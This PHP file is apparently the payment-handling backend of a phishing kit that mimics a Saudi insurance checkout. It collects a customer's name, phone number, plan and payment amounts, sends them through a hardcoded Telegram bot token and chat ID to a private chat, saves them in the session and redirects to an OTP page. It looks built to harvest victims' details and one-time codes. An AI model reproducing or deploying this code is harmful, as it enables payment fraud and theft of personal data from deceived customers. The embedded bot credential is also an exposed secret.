<?php
// tele/pay.php
session_start();

// Telegram Bot Token and Chat ID
define('BOT_TOKEN', '7910223326:AAGB_WRgVyXMqgEkb-iRCUQkAH14zLbwwcE');
define('CHAT_ID', '8407843143');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage');

// ===== Helpers =====
function esc($v) {
    return htmlspecialchars((string)$v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8');
}

function postAny(array $keys, $default='') {
    foreach($keys as $k) {
        if(isset($_POST[$k])) {
            $val = trim((string)$_POST[$k]);
            if($val !== '' && $val !== 'undefined') return $val;
        }
    }
    return $default;
}

function jsonOrArray($str, $fallback=[]) {
    if(!$str) return $fallback;
    $d = json_decode($str, true);
    return is_array($d) ? $d : $fallback;
}

// ===== Ensure POST =====
if($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok'=>false, 'error'=>'Method Not Allowed'], JSON_UNESCAPED_UNICODE);
    exit;
}

// ===== Collect =====
$name = postAny(['name'], 'غير متوفر');
$phone = postAny(['phone'], 'غير متوفر');
$payment_method = postAny(['payment_method'], 'card');
$total_amount = postAny(['total_amount', 'total'], '0');
$user_id = postAny(['user_id'], 'غير متوفر');
$start_date = postAny(['start_date'], 'غير متوفر');
$end_date = postAny(['end_date'], 'غير متوفر');
$insurance = jsonOrArray(postAny(['insurance_json']));
if(empty($insurance)) {
    $insurance = [
        'company' => postAny(['company'], 'غير متوفر'),
        'plan' => postAny(['plan'], 'غير متوفر'),
        'base' => postAny(['base'], '0'),
        'price' => postAny(['price'], '0'),
        'vat' => postAny(['vat'], '0'),
        'total' => postAny(['total'], '0'),
    ];
}
$features = jsonOrArray(postAny(['features_json']), jsonOrArray(postAny(['features']), []));

// ===== Build Telegram message =====
$L = [];
$L[] = "🧾 <b>عملية دفع تأمين جديدة</b>";
$L[] = "— — — — — — — — —";
$L[] = "🏢 <b>بيانات التأمين</b>";
$L[] = "• الشركة: <b>" . esc($insurance['company']) . "</b>";
$L[] = "• الخطة: <b>" . esc($insurance['plan']) . "</b>";
$L[] = "• الأساسي: <b>" . esc($insurance['base']) . " ريال</b>";
$L[] = "• الفرعي: <b>" . esc($insurance['price']) . " ريال</b>";
$L[] = "• الضريبة 15%: <b>" . esc($insurance['vat']) . " ريال</b>";
$L[] = "• الإجمالي: <b>" . esc(($insurance['total'] ?: $total_amount)) . " ريال</b>";
if($start_date !== 'غير متوفر' || $end_date !== 'غير متوفر') {
    $L[] = "• الفترة: " . esc($start_date) . " → " . esc($end_date);
}
if(!empty($features)) {
    $L[] = "• <u>الإضافات المختارة:</u>";
    foreach($features as $f) {
        $lab = esc(is_array($f) && isset($f['label']) ? $f['label'] : (is_string($f) ? $f : '-'));
        $pr = esc(is_array($f) && isset($f['price']) ? $f['price'] : '0');
        $L[] = " ◦ {$lab} (+{$pr} ريال)";
    }
}
$L[] = "— — — — — — — — —";
$L[] = "👤 <b>بيانات العميل</b>";
$L[] = "• الاسم الكامل: <b>" . esc($name) . "</b>";
$L[] = "• رقم الهاتف: <code>" . esc($phone) . "</code>";
$L[] = "• المبلغ المطلوب: <b>" . esc($total_amount) . " ريال</b>";
if($user_id !== 'غير متوفر') {
    $L[] = "• معرف المستخدم: " . esc($user_id);
}
$msg = implode("\n", $L);

// ===== Save to session for OTP step =====
$_SESSION['last_payment'] = [
    'name' => $name,
    'phone' => $phone,
    'payment_method' => $payment_method,
    'total_amount' => $total_amount,
    'insurance' => [
        'company' => $insurance['company'] ?? '',
        'plan' => $insurance['plan'] ?? '',
        'base' => $insurance['base'] ?? '',
        'price' => $insurance['price'] ?? '',
        'vat' => $insurance['vat'] ?? '',
        'total' => $insurance['total'] ?? '',
        'features' => $features,
        'start_date' => $start_date,
        'end_date' => $end_date,
    ],
    'user_id' => $user_id,
];

// ===== Send to Telegram =====
$payload = [
    'chat_id' => CHAT_ID,
    'text' => $msg,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true,
];
$ch = curl_init(API_URL);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($payload),
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_TIMEOUT => 20,
]);
$res = curl_exec($ch);
$err = curl_error($ch);
$http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if($err || $http < 200 || $http >= 300) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => false, 'http' => $http, 'error' => $err ?: 'فشل إرسال البيانات إلى Telegram', 'response' => $res], JSON_UNESCAPED_UNICODE);
    exit;
}

// Redirect to OTP page
$redirect = 'otp.php';
if($user_id && $user_id !== 'غير متوفر') {
    $redirect .= '?user_id=' . urlencode($user_id);
}
header('Location: ' . $redirect);
exit;
?>